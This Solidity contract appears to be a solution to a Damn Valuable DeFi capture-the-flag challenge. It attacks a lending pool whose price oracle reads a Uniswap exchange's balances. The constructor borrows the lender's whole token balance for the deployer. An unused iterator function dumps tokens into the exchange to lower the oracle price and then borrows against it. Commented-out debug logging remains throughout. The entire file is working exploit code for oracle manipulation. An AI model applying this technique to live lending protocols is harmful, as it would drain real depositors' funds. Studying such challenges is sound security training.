// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "hardhat/console.sol";

contract Taker {
    using Address for address payable;

    address public immutable uniswapExchange;
    DamnValuableToken public immutable token;
    address lender;
       
    constructor(address tokenAddress, address uniswapExchangeAddress, address _lender) payable {
        token = DamnValuableToken(tokenAddress);
        uniswapExchange = uniswapExchangeAddress;
        lender = _lender;
        
        (bool successBorrow, ) = lender.call{value: address(this).balance}(
            abi.encodeWithSignature(
                "borrow(uint256,address)",
                token.balanceOf(address(lender)),
                msg.sender
            )
        );
        console.log("successBorrow", successBorrow);
    }
   
    function iterator(uint256 deposit, uint8 index) private {
        uint256 amount = calculateBorrowAmount(deposit);
        (bool successBorrow, ) = lender.call{value: deposit}(
            abi.encodeWithSignature(
                "borrow(uint256,address)",
                amount,
                address(this)
            )
        );
        // console.log("borrow", index, successBorrow);
        // console.log("ethBalance", address(this).balance);
        // console.log("tokenBalance", token.balanceOf(address(this)));
        
        token.approve(uniswapExchange, token.balanceOf(address(this)));
        
        (bool successSwap, ) = uniswapExchange.call(
        abi.encodeWithSignature(
            "tokenToEthSwapInput(uint256,uint256,uint256)",
            token.balanceOf(address(this)),
            1,
            block.timestamp * 2
            )
        );
        // console.log("swap", index, successSwap);
        // console.log("ethBalance", address(this).balance);
        // console.log("tokenBalance", token.balanceOf(address(this)));
        // console.log("_computeOraclePrice", _computeOraclePrice());  
    }

    function calculateBorrowAmount(uint256 deposit) public view returns (uint256) {
        return ((deposit * 10 ** 18) / (_computeOraclePrice() * 2));
    }

    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap Exchange
        return uniswapExchange.balance * (10 ** 18) / token.balanceOf(uniswapExchange);
    }
}